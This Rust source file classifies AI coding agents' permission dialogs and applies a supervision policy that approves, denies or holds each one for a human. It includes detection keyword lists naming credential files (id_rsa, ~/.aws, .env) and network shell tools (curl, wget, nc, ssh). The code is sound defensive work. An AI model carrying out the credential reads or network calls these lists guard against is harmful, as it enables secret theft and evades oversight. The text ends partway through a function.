//! Supervision classification for interactive agent permission dialogs.
//!
//! Classifies [`PendingDialog`] instances into semantic [`DialogClass`] categories,
//! extracts subject entities (commands, file paths, hosts), and conservatively evaluates
//! whether an action is provably scoped to the repo worktree.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

use crate::agent::approval;
use crate::agent::prompt::{PendingDialog, PromptClass};
use crate::model::{AgentKind, LaneId};

/// Semantic category of a permission dialog.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub enum DialogClass {
    CommandExec,
    FileWrite,
    NetworkAccess,
    CredentialAccess,
    Deletion,
    PushRemote,
    Install,
    DeviceAccess,
    Unknown,
}

/// The action to take when evaluating a permission dialog.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub enum PolicyAction {
    AutoApprove,
    AutoDeny,
    Hold,
}

/// Delivery mode for agent supervisor nudges / mail.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub enum MailDeliveryMode {
    #[default]
    Nudge,
    FullBody,
}

/// Origin / rationale for the resolved policy decision.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub enum PolicySource {
    LaneClass,
    GlobalClass,
    ApprovalRule,
    AlwaysEscalate,
    DecisionClass,
    AmbiguousOptions,
    NotRepoScoped,
    Default,
}

/// Global defaults for agent supervision.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct SupervisionConfig {
    pub enabled: bool,
    pub nudge_text: String,
    pub mail_mode: MailDeliveryMode,
    pub stall_mins: u32,
    pub nudge_retries: u32,
    pub classes: BTreeMap<DialogClass, PolicyAction>,
}

impl Default for SupervisionConfig {
    fn default() -> Self {
        let mut classes = BTreeMap::new();
        classes.insert(DialogClass::CommandExec, PolicyAction::AutoApprove);
        classes.insert(DialogClass::FileWrite, PolicyAction::AutoApprove);
        classes.insert(DialogClass::NetworkAccess, PolicyAction::Hold);
        classes.insert(DialogClass::CredentialAccess, PolicyAction::Hold);
        classes.insert(DialogClass::Deletion, PolicyAction::Hold);
        classes.insert(DialogClass::PushRemote, PolicyAction::Hold);
        classes.insert(DialogClass::Install, PolicyAction::Hold);
        classes.insert(DialogClass::DeviceAccess, PolicyAction::Hold);
        classes.insert(DialogClass::Unknown, PolicyAction::Hold);

        Self {
            enabled: false,
            nudge_text: "Check your repomon mail and act on it.".to_string(),
            mail_mode: MailDeliveryMode::Nudge,
            stall_mins: 20,
            nudge_retries: 2,
            classes,
        }
    }
}

/// One lane's stored policy row.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct SupervisionOverrides {
    #[cfg_attr(feature = "ts", ts(type = "number"))]
    pub lane_id: LaneId,
    pub enabled: bool,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub classes: BTreeMap<DialogClass, PolicyAction>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mail_mode: Option<MailDeliveryMode>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nudge_text: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stall_mins: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub nudge_retries: Option<u32>,
    pub expect_work: bool,
    pub updated_at: DateTime<Utc>,
}

/// Effective, fully resolved supervision policy used by the daemon loop.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct SupervisionPolicy {
    pub enabled: bool,
    pub classes: BTreeMap<DialogClass, PolicyAction>,
    pub mail_mode: MailDeliveryMode,
    pub nudge_text: String,
    pub stall_mins: u32,
    pub nudge_retries: u32,
    pub expect_work: bool,
}

/// Evaluation outcome for a classified dialog.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct Decision {
    pub action: PolicyAction,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub choice: Option<usize>,
    pub source: PolicySource,
    pub reason: String,
}

/// Fully resolve effective supervision policy from global config defaults and optional lane overrides.
pub fn resolve(
    defaults: &SupervisionConfig,
    lane: Option<&SupervisionOverrides>,
) -> SupervisionPolicy {
    let mut default_classes = SupervisionConfig::default().classes;
    for (k, v) in &defaults.classes {
        default_classes.insert(*k, *v);
    }

    let enabled = defaults.enabled && lane.is_some_and(|l| l.enabled);
    let mut classes = default_classes;
    let mut mail_mode = defaults.mail_mode;
    let mut nudge_text = defaults.nudge_text.clone();
    let mut stall_mins = defaults.stall_mins;
    let mut nudge_retries = defaults.nudge_retries;
    let mut expect_work = false;

    if let Some(l) = lane {
        for (k, v) in &l.classes {
            classes.insert(*k, *v);
        }
        if let Some(m) = l.mail_mode {
            mail_mode = m;
        }
        if let Some(ref n) = l.nudge_text {
            nudge_text = n.clone();
        }
        if let Some(s) = l.stall_mins {
            stall_mins = s;
        }
        if let Some(r) = l.nudge_retries {
            nudge_retries = r;
        }
        expect_work = l.expect_work;
    }

    SupervisionPolicy {
        enabled,
        classes,
        mail_mode,
        nudge_text,
        stall_mins,
        nudge_retries,
        expect_work,
    }
}

/// Purely evaluate what action to take on a classified dialog under the given effective policy.
pub fn evaluate(
    policy: &SupervisionPolicy,
    c: &Classification,
    d: &PendingDialog,
    kind: AgentKind,
    extra_allow: bool,
) -> Decision {
    // 1. Always escalate check on subject
    if c.subject
        .as_deref()
        .is_some_and(approval::is_always_escalate)
    {
        return Decision {
            action: PolicyAction::Hold,
            choice: None,
            source: PolicySource::AlwaysEscalate,
            reason: "Subject matched always-escalate pattern".to_string(),
        };
    }

    // 2. Decision questions are never auto-answered
    if d.class() == PromptClass::Decision {
        return Decision {
            action: PolicyAction::Hold,
            choice: None,
            source: PolicySource::DecisionClass,
            reason: "Prompt requires human decision".to_string(),
        };
    }

    // 3. Look up policy action for dialog class
    let map_action = policy
        .classes
        .get(&c.class)
        .copied()
        .unwrap_or(PolicyAction::Hold);

    let (mut action, mut source) = match c.class {
        DialogClass::Unknown => (PolicyAction::Hold, PolicySource::GlobalClass),
        DialogClass::CommandExec | DialogClass::FileWrite | DialogClass::Deletion => {
            if map_action == PolicyAction::AutoApprove && !c.repo_scoped {
                (PolicyAction::Hold, PolicySource::NotRepoScoped)
            } else {
                (map_action, PolicySource::GlobalClass)
            }
        }
        _ => (map_action, PolicySource::GlobalClass),
    };

    // 4. Learned approval rule: extra_allow lifts a Hold to AutoApprove ONLY when
    // c.class == CommandExec && c.repo_scoped and rule 1 did not fire.
    if action == PolicyAction::Hold
        && extra_allow
        && c.class == DialogClass::CommandExec
        && c.repo_scoped
    {
        action = PolicyAction::AutoApprove;
        source = PolicySource::ApprovalRule;
    }

    // 5. Option index mapping & outcome construction
    match action {
        PolicyAction::AutoApprove => {
            if let Some(idx) = approve_option(d, kind) {
                Decision {
                    action: PolicyAction::AutoApprove,
                    choice: Some(idx),
                    source,
                    reason: format!("Auto-approved {:?}", c.class),
                }
            } else {
                Decision {
                    action: PolicyAction::Hold,
                    choice: None,
                    source: PolicySource::AmbiguousOptions,
                    reason: "No unambiguous single-shot approve option found".to_string(),
                }
            }
        }
        PolicyAction::AutoDeny => {
            if let Some(idx) = deny_option(d, kind) {
                Decision {
                    action: PolicyAction::AutoDeny,
                    choice: Some(idx),
                    source,
                    reason: format!("Auto-denied {:?}", c.class),
                }
            } else {
                Decision {
                    action: PolicyAction::Hold,
                    choice: None,
                    source: PolicySource::AmbiguousOptions,
                    reason: "No unambiguous deny option found".to_string(),
                }
            }
        }
        PolicyAction::Hold => {
            let reason = match source {
                PolicySource::NotRepoScoped => {
                    "Action is not verified to be repo-scoped".to_string()
                }
                _ => format!("Policy for {:?} is Hold", c.class),
            };
            Decision {
                action: PolicyAction::Hold,
                choice: None,
                source,
                reason,
            }
        }
    }
}

/// The filesystem scope of the repository and worktree against which actions are evaluated.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct DialogScope {
    pub worktree: PathBuf,
    pub repo_root: PathBuf,
}

/// The result of classifying a pending dialog.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
#[cfg_attr(feature = "ts", ts(export))]
pub struct Classification {
    pub class: DialogClass,
    pub repo_scoped: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub subject: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence: Vec<String>,
}

/// Classify a pending interactive dialog into a [`DialogClass`] and determine whether
/// the requested operation is provably contained within the repository worktree.
pub fn classify_dialog(d: &PendingDialog, kind: AgentKind, scope: &DialogScope) -> Classification {
    let _ = kind; // Accepted for future per-kind quirks

    let mut parts: Vec<&str> = Vec::new();
    if let Some(ref t) = d.title {
        parts.push(t);
    }
    parts.push(&d.question);
    for b in &d.body {
        parts.push(b);
    }
    for c in &d.context {
        parts.push(c);
    }
    let full_text = parts.join("\n");
    let full_text_lower = full_text.to_lowercase();
    let title_lower = d.title.as_deref().unwrap_or("").to_lowercase();
    let question_lower = d.question.to_lowercase();

    // 1. CredentialAccess: token, api key, api_key, secret, .env, ~/.aws, credential,
    // keychain, password, ssh key, id_rsa, .pem
    let cred_markers = [
        "token",
        "api key",
        "api_key",
        "secret",
        ".env",
        "~/.aws",
        "credential",
        "keychain",
        "password",
        "ssh key",
        "id_rsa",
        ".pem",
    ];
    let cred_evidence: Vec<String> = cred_markers
        .iter()
        .filter(|&&m| full_text_lower.contains(m))
        .map(|&m| m.to_string())
        .collect();
    if !cred_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::CredentialAccess);
        return Classification {
            class: DialogClass::CredentialAccess,
            repo_scoped: false,
            subject,
            evidence: cred_evidence,
        };
    }

    // 2. PushRemote: git push, gh pr, gh release, git remote, git fetch/git pull when URL is present
    let mut push_evidence = Vec::new();
    for &m in &["git push", "gh pr", "gh release", "git remote"] {
        if full_text_lower.contains(m) {
            push_evidence.push(m.to_string());
        }
    }
    let has_url = full_text_lower.contains("http://")
        || full_text_lower.contains("https://")
        || full_text_lower.contains("git@")
        || full_text_lower.contains("ssh://")
        || full_text_lower.contains("git://");
    if (full_text_lower.contains("git fetch") || full_text_lower.contains("git pull")) && has_url {
        if full_text_lower.contains("git fetch") {
            push_evidence.push("git fetch".to_string());
        }
        if full_text_lower.contains("git pull") {
            push_evidence.push("git pull".to_string());
        }
    }
    if !push_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::PushRemote);
        return Classification {
            class: DialogClass::PushRemote,
            repo_scoped: false,
            subject,
            evidence: push_evidence,
        };
    }

    // 3. Install: npm i/npm install, pnpm add, bun add, cargo install, brew install,
    // pip install, apt install, apt-get install, gem install
    let mut install_evidence = Vec::new();
    let install_markers = [
        "npm install",
        "pnpm add",
        "bun add",
        "cargo install",
        "brew install",
        "pip install",
        "apt install",
        "apt-get install",
        "gem install",
    ];
    for &m in &install_markers {
        if full_text_lower.contains(m) {
            install_evidence.push(m.to_string());
        }
    }
    if has_npm_i(&full_text_lower) && !install_evidence.iter().any(|m| m == "npm install") {
        install_evidence.push("npm i".to_string());
    }
    if !install_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::Install);
        return Classification {
            class: DialogClass::Install,
            repo_scoped: false,
            subject,
            evidence: install_evidence,
        };
    }

    // 4. DeviceAccess: osascript, camera, microphone, screen recording, screencapture,
    // system_profiler, defaults write
    let device_markers = [
        "osascript",
        "camera",
        "microphone",
        "screen recording",
        "screencapture",
        "system_profiler",
        "defaults write",
    ];
    let device_evidence: Vec<String> = device_markers
        .iter()
        .filter(|&&m| full_text_lower.contains(m))
        .map(|&m| m.to_string())
        .collect();
    if !device_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::DeviceAccess);
        return Classification {
            class: DialogClass::DeviceAccess,
            repo_scoped: false,
            subject,
            evidence: device_evidence,
        };
    }

    // 5. NetworkAccess: curl, wget, nc , ssh , http://, https://
    let mut net_evidence = Vec::new();
    for &m in &["curl", "wget", "http://", "https://"] {
        if full_text_lower.contains(m) {
            net_evidence.push(m.to_string());
        }
    }
    if full_text_lower.contains("nc ") || has_standalone_token(&full_text_lower, "nc") {
        net_evidence.push("nc".to_string());
    }
    if full_text_lower.contains("ssh ") || has_standalone_token(&full_text_lower, "ssh") {
        net_evidence.push("ssh".to_string());
    }
    if !net_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::NetworkAccess);
        let repo_scoped = is_network_safe(&full_text, &net_evidence);
        return Classification {
            class: DialogClass::NetworkAccess,
            repo_scoped,
            subject,
            evidence: net_evidence,
        };
    }

    // 6. Deletion: rm , rm -, unlink, git clean, title/question containing delete file
    let mut del_evidence = Vec::new();
    for &m in &["rm -", "unlink", "git clean"] {
        if full_text_lower.contains(m) {
            del_evidence.push(m.to_string());
        }
    }
    if (full_text_lower.contains("rm ") || has_standalone_token(&full_text_lower, "rm"))
        && !del_evidence.iter().any(|m| m.starts_with("rm"))
    {
        del_evidence.push("rm".to_string());
    }
    if title_lower.contains("delete file") || question_lower.contains("delete file") {
        del_evidence.push("delete file".to_string());
    }
    if !del_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::Deletion);
        let repo_scoped = is_deletion_scoped(&full_text, subject.as_deref(), scope);
        return Classification {
            class: DialogClass::Deletion,
            repo_scoped,
            subject,
            evidence: del_evidence,
        };
    }

    // 7. FileWrite: title/question containing edit file, create file, write, apply patch, multiedit
    let mut write_evidence = Vec::new();
    for &m in &["edit file", "create file", "apply patch", "multiedit"] {
        if title_lower.contains(m) || question_lower.contains(m) {
            write_evidence.push(m.to_string());
        }
    }
    if (title_lower.contains("write") || question_lower.contains("write"))
        && !write_evidence.iter().any(|m| m.contains("write"))
    {
        write_evidence.push("write".to_string());
    }
    if (question_lower.contains("make this edit") || question_lower.contains("make these edits"))
        && !write_evidence.iter().any(|m| m == "edit file")
    {
        write_evidence.push("edit file".to_string());
    }
    if question_lower.contains("do you want to create")
        && !write_evidence.iter().any(|m| m == "create file")
    {
        write_evidence.push("create file".to_string());
    }
    if !write_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::FileWrite);
        let repo_scoped = is_file_write_scoped(subject.as_deref(), scope);
        return Classification {
            class: DialogClass::FileWrite,
            repo_scoped,
            subject,
            evidence: write_evidence,
        };
    }

    // 8. CommandExec: title starting bash, or run command, run tool, requesting permission, wants to run
    let mut cmd_evidence = Vec::new();
    if title_lower.starts_with("bash") {
        cmd_evidence.push("bash".to_string());
    }
    for &m in &[
        "run command",
        "run tool",
        "requesting permission",
        "wants to run",
    ] {
        if full_text_lower.contains(m) {
            cmd_evidence.push(m.to_string());
        }
    }
    if !cmd_evidence.is_empty() {
        let subject = extract_subject(d, DialogClass::CommandExec);
        let repo_scoped = is_command_scoped(subject.as_deref(), scope);
        return Classification {
            class: DialogClass::CommandExec,
            repo_scoped,
            subject,
            evidence: cmd_evidence,
        };
    }

    // 9. Unknown: anything else
    let subject = extract_subject(d, DialogClass::Unknown);
    Classification {
        class: DialogClass::Unknown,
        repo_scoped: false,
        subject,
        evidence: Vec::new(),
    }
}

/// Check if text contains `npm i` as command token(s).
fn has_npm_i(text: &str) -> bool {
    for line in text.lines() {
        let tokens: Vec<&str> = line.split_whitespace().collect();
        for (i, &t) in tokens.iter().enumerate() {
            if t == "npm" && tokens.get(i + 1) == Some(&"i") {
                return true;
            }
        }
    }
    false
}

/// Check if a standalone whitespace token matches the target word.
fn has_standalone_token(text: &str, token: &str) -> bool {
    for line in text.lines() {
        for t in line.split_whitespace() {
            let clean = t.trim_matches(|c: char| {
                c == '\'' || c == '"' || c == '`' || c == ',' || c == ';' || c == ':'
            });
            if clean == token {
                return true;
            }
        }
    }
    false
}

/// Check whether a path token stays inside the repository worktree or root.
fn is_path_in_scope(token: &str, scope: &DialogScope) -> bool {
    let clean = token.trim_matches(|c: char| {
        c == '\'' || c == '"' || c == '`' || c == ',' || c == ';' || c == ':'
    });
    if clean.is_empty() {
        return true;
    }
    // Reject any token containing .. (directory traversal)
    if clean.contains("..") {
        return false;
    }
    // Reject ~-prefixed paths (e.g. ~/.aws/credentials)
    if clean.starts_with('~') {
        return false;
    }
    // Absolute paths must start with worktree or repo_root
    let p = Path::new(clean);
    if p.is_absolute() {
        if p.starts_with(&scope.worktree) || p.starts_with(&scope.repo_root) {
            return true;
        }
        return false;
    }
    // Relative paths without .. count as in-scope
    true
}

/// Extract all HTTP/HTTPS URLs from text.
fn extract_urls(text: &str) -> Vec<String> {
    let mut urls = Vec::new();
    for word in text.split_whitespace() {
        let trimmed = word.trim_matches(|c: char| {
            c == '\''
                || c == '"'
                || c == '('
                || c == ')'
                || c == '<'
                || c == '>'
                || c == ','
                || c == ';'
        });
        if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
            urls.push(trimmed.to_string());
        }
    }
    urls
}

/// Extract the hostname from a URL.
fn get_url_host(url: &str) -> Option<&str> {
    let without_scheme = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))?;
    let host = without_scheme.split(&['/', ':', '?', '#'][..]).next()?;
    Some(host)
}

/// Check if NetworkAccess destinations are all safe package registries or localhost.
fn is_network_safe(text: &str, evidence: &[String]) -> bool {
    if evidence.iter().any(|e| e == "nc" || e == "ssh") {
        return false;
    }
    if approval::is_always_escalate(text) {
        return false;
    }
    let urls = extract_urls(text);
    if urls.is_empty() {
        return false;
    }
    for url in &urls {
        if let Some(host) = get_url_host(url) {
            let host_lower = host.to_lowercase();
            let is_safe = match host_lower.as_str() {
                "localhost"
                | "127.0.0.1"
                | "registry.npmjs.org"
                | "crates.io"
                | "static.crates.io"
                | "pypi.org"
                | "files.pythonhosted.org" => true,
                "github.com" => url.starts_with("https://"),
                _ => false,
            };
            if !is_safe {
                return false;
            }
        } else {
            return false;
        }
    }
    true
}

/// Check if a Deletion action is scoped to the repository worktree.
fn is_deletion_scoped(text: &str, subject: Option<&str>, scope: &DialogScope) -> bool {
    if approval::is_always_escalate(text) {
        return false;
    }
    if let Some(sub) = subject {
        if approval::is_always_escalate(sub) {
            return false;
        }
        let tokens: Vec<&str> = sub.split_whitespace().collect();
        let target_paths: Vec<&str> = tokens
            .into_iter()
            .filter(|t| {
                !t.starts_with('-') && *t != "rm" && *t != "unlink" && *t != "git" && *t != "clean"
            })
            .collect();
        if target_paths.is_empty() {
            return is_path_in_scope(sub, scope);
        }
        for tp in target_paths {
            if !is_path_in_scope(tp, scope) {
                return false;
            }
        }
        return true;
    }
    false
}

/// Check if a FileWrite action is scoped to the repository worktree.
fn is_file_write_scoped(subject: Option<&str>, scope: &DialogScope) -> bool {
    if let Some(sub) = subject {
        if approval::is_always_escalate(sub) {
            return false;
        }
        return is_path_in_scope(sub, scope);
    }
    false
}

/// Check if a single command segment is allowlisted and within repo scope.
fn is_segment_allowlisted(seg: &str, scope: &DialogScope) -> bool {
    let s = seg.trim();
    if s.is_empty() {
        return false;
    }
    let tokens: Vec<&str> = s.split_whitespace().collect();
    if tokens.is_empty() {
        return false;
    }

    let bin_raw = tokens[0];
    let bin = Path::new(bin_raw)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(bin_raw);

    let allowlisted = match bin {
        "cargo" | "bun" | "npm" | "pnpm" | "yarn" | "go" | "make" | "pytest" | "rg" | "grep"
        | "ls" | "cat" | "tsc" | "vitest" | "eslint" => true,
        "python" | "python3" => tokens.get(1) == Some(&"-m") && tokens.get(2) == Some(&"pytest"),
        "sed" => tokens
            .iter()
            .any(|&t| t == "-n" || (t.starts_with('-') && t.contains('n'))),
        "git" => {
            let sub = tokens.get(1).copied().unwrap_or("");
            matches!(sub, "status" | "diff" | "log" | "add" | "commit" | "show")
        }
        _ => false,
    };

    if !allowlisted {
        return false;
    }

    for token in &tokens {
        if token.starts_with('-') {
            if let Some((_, val)) = token.split_once('=') {
                if !is_path_in_scope(val, scope) {
                    return false;
                }
            }
            continue;
        }
        let clean =
            token.trim_matches(|c: char| c == '\'' || c == '"' || c == '`' || c == ',' || c == ';');
        if !is_path_in_scope(clean, scope) {
            return false;
        }
    }

    true
}

/// Split compound commands by `&&`, `||`, `;`, `|` outside quotes.
fn split_compound_command(cmd: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut chars = cmd.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
                current.push(c);
            }
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
                current.push(c);
            }
            '&' if !in_single_quote && !in_double_quote && chars.peek() == Some(&'&') => {
                chars.next();
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
            }
            '|' if !in_single_quote && !in_double_quote => {
                if chars.peek() == Some(&'|') {
                    chars.next();
                }
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
            }
            ';' if !in_single_quote && !in_double_quote => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    segments.push(trimmed);
                }
                current.clear();
            }
            _ => {
                current.push(c);
            }
        }
    }
    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        segments.push(trimmed);
    }
    segments
}

/// Check if a command is allowlisted and scoped to the repository worktree.
fn is_command_scoped(subject: Option<&str>, scope: &DialogScope) -> bool {
    let Some(cmd) = subject else {
        return false;
    };
    if approval::is_always_escalate(cmd) {
        return false;
    }
    let segments = split_compound_command(cmd);
    if segments.is_empty() {
        return false;
    }
    for seg in segments {
        if !is_segment_allowlisted(&seg, scope) {
            return false;
        }
    }
    true
}

/// Extract subject from a pending dialog.
fn extract_subject(d: &PendingDialog, class: DialogClass) -> Option<String> {
    if let Some(cmd) = approval::dialog_command(d) {
        return Some(cmd);
    }

    if let Some(tool) = extract_tool_name(&d.question) {
        return Some(tool);
    }

    if class == DialogClass::FileWrite {
        if let Some(path) = extract_file_path_from_dialog(d) {
            return Some(path);
        }
    }

    for line in &d.context {
        let t = line.trim();
        if is_header_or_label_line(t) {
            continue;
        }
        if !t.is_empty() {
            return Some(t.to_string());
        }
    }

    for line in &d.body {
        let t = line.trim();
        if !t.is_empty() {
            return Some(t.to_string());
        }
    }

    if let Some(cmd) = extract_command_from_question(&d.question) {
        return Some(cmd);
    }

    None
}

/// Extract tool name from a question like `Allow the repomon MCP server to run tool "fleet_status"?`.
fn extract_tool_name(question: &str) -> Option<String> {
    let lower = question.to_lowercase();
    let idx = lower.find("tool \"")?;
    let rest = &question[idx + "tool \"".len()..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

/// Identify if a line is a decorative header or field label rather than actionable content.
fn is_header_or_label_line(line: &str) -> bool {
    let l = line.to_lowercase();
    l.ends_with(':')
        || l.starts_with("field ")
        || l.starts_with("security guide")
        || l.starts_with("───")
}

/// Extract target file path from dialog body, question, or context.
fn extract_file_path_from_dialog(d: &PendingDialog) -> Option<String> {
    for line in &d.body {
        let t = line.trim();
        if !t.is_empty() {
            return Some(t.to_string());
        }
    }
    let q = &d.question;
    let lower = q.to_lowercase();
    if let Some(idx) = lower.find("edit to ") {
        let rest = q[idx + "edit to ".len()..].trim().trim_end_matches('?');
        if !rest.is_empty() {
            return Some(rest.to_string());
        }
    }
    if let Some(idx) = lower.find("create ") {
        let rest = q[idx + "create ".len()..].trim().trim_end_matches('?');
        if !rest.is_empty() {
            return Some(rest.to_string());
        }
    }
    for line in &d.context {
        let t = line.trim();
        if !is_header_or_label_line(t) && !t.is_empty() {
            return Some(t.to_string());
        }
    }
    None
}

/// Extract command substring from questions like `Do you want to run cargo test?`.
fn extract_command_from_question(question: &str) -> Option<String> {
    let lower = question.to_lowercase();
    if let Some(idx) = lower.find("run ") {
        let rest = question[idx + "run ".len()..].trim().trim_end_matches('?');
        if !rest.is_empty() {
            return Some(rest.to_string());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Option Mapping (approve_option / deny_option)
// ---------------------------------------------------------------------------

/// Substrings that permanently disqualify an option from single-shot approval.
const APPROVE_BLACKLIST: &[&str] = &[
    "always allow",
    "always",
    "for this session",
    "don't ask again",
    "dont ask again",
    "persist",
    "remember this choice",
    "in settings",
    "settings.json",
    "in this conversation",
];

/// Candidate phrases for single-shot approval, ordered for prefix matching.
const APPROVE_PHRASES: &[&str] = &[
    "yes, i trust this folder",
    "allow once",
    "run the tool",
    "yes",
    "allow",
    "proceed",
    "approve",
];

/// Candidate phrases for denial/rejection, ordered for prefix matching.
const DENY_PHRASES: &[&str] = &[
    "no, and tell",
    "don't allow",
    "dont allow",
    "do not allow",
    "no, exit",
    "no",
    "cancel",
    "reject",
    "exit",
    "deny",
];

/// Whether option text contains any blacklist token that grants standing permission.
fn is_blacklisted_approve(text: &str) -> bool {
    let lower = text.to_lowercase();
    APPROVE_BLACKLIST.iter().any(|&b| lower.contains(b))
}

/// Check if `text` starts with `phrase` as a leading word/phrase at a boundary.
fn starts_with_phrase(text: &str, phrase: &str) -> bool {
    let t = text.trim();
    if t.len() < phrase.len() {
        return false;
    }
    if !t[..phrase.len()].eq_ignore_ascii_case(phrase) {
        return false;
    }
    if t.len() == phrase.len() {
        return true;
    }
    let next_char = t[phrase.len()..].chars().next().unwrap();
    !next_char.is_alphanumeric()
}

/// Whether an approve option is an exact/plainer match (Level 1) rather than a qualified option (Level 2).
fn is_level_1_approve(text: &str, matched_phrase: &str) -> bool {
    let t = text.trim();
    let clean = t.trim_end_matches(['.', '!', ':', ',']).trim();
    if clean.eq_ignore_ascii_case(matched_phrase) {
        return true;
    }
    if t.len() > matched_phrase.len() {
        let rest = &t[matched_phrase.len()..];
        if rest.starts_with("  ") || rest.starts_with('\t') {
            return true;
        }
    }
    if matched_phrase == "yes, i trust this folder"
        || matched_phrase == "allow once"
        || matched_phrase == "run the tool"
    {
        return true;
    }
    if clean.eq_ignore_ascii_case("yes, proceed") {
        return true;
    }
    false
}

/// Whether a deny option is an exact/plainer match (Level 1) rather than a qualified option (Level 2).
fn is_level_1_deny(text: &str, matched_phrase: &str) -> bool {
    let t = text.trim();
    let clean = t.trim_end_matches(['.', '!', ':', ',']).trim();
    if clean.eq_ignore_ascii_case(matched_phrase) {
        return true;
    }
    if t.len() > matched_phrase.len() {
        let rest = &t[matched_phrase.len()..];
        if rest.starts_with("  ") || rest.starts_with('\t') {
            return true;
        }
    }
    if clean.eq_ignore_ascii_case("no, exit")
        || clean.eq_ignore_ascii_case("no, and tell claude what to do")
        || clean.eq_ignore_ascii_case("no, and tell")
        || clean.eq_ignore_ascii_case("no, tell claude what to do")
    {
        return true;
    }
    if matched_phrase == "no, and tell"
        || matched_phrase == "don't allow"
        || matched_phrase == "dont allow"
        || matched_phrase == "do not allow"
    {
        return true;
    }
    false
}

struct MatchCandidate {
    index: usize,
    level: u8,
    text_len: usize,
}

fn resolve_candidates(candidates: Vec<MatchCandidate>) -> Option<usize> {
    if candidates.is_empty() {
        return None;
    }
    if candidates.len() == 1 {
        return Some(candidates[0].index);
    }
    let level_1_candidates: Vec<&MatchCandidate> =
        candidates.iter().filter(|c| c.level == 1).collect();

    if level_1_candidates.is_empty() {
        return None;
    }

    if level_1_candidates.len() == 1 {
        return Some(level_1_candidates[0].index);
    }

    let min_len = level_1_candidates.iter().map(|c| c.text_len).min().unwrap();
    let shortest: Vec<&&MatchCandidate> = level_1_candidates
        .iter()
        .filter(|c| c.text_len == min_len)
        .collect();

    if shortest.len() == 1 {
        Some(shortest[0].index)
    } else {
        None
    }
}

/// Determine which option index in [`PendingDialog`] represents a single-shot approval ("approve once"),
/// with a hard guarantee that standing/persisted grants (e.g. "always allow", "for this session") are never selected.
pub fn approve_option(d: &PendingDialog, _kind: AgentKind) -> Option<usize> {
    let mut candidates = Vec::new();

    for (i, opt) in d.options.iter().enumerate() {
        let text = opt.text.trim();
        if is_blacklisted_approve(text) {
            continue;
        }

        let mut best_match: Option<&'static str> = None;
        for &phrase in APPROVE_PHRASES {
            if starts_with_phrase(text, phrase)
                && (best_match.is_none() || phrase.len() > best_match.unwrap().len())
            {
                best_match = Some(phrase);
            }
        }

        if let Some(phrase) = best_match {
            let level = if is_level_1_approve(text, phrase) {
                1
            } else {
                2
            };
